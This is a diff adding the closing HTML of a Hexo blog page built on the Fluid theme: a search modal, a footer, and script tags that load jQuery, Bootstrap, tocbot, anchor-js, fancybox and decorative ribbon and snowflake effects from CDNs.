+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
